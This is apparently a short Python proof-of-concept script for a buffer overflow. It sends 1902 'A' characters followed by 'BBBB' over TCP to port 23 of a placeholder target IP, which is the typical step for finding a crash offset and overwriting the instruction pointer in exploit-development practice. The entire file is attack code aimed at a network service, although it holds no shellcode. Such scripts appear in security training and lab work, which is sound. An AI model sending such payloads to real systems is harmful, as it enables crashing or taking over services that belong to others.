#!/usr/bin/python3
import sys, socket
from time import sleep

# Use bytes directly to avoid encoding issues
buffer = "A" * 1902 + 'BBBB'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("TARGET IP", 23))
s.send(buffer.encode())
s.close()
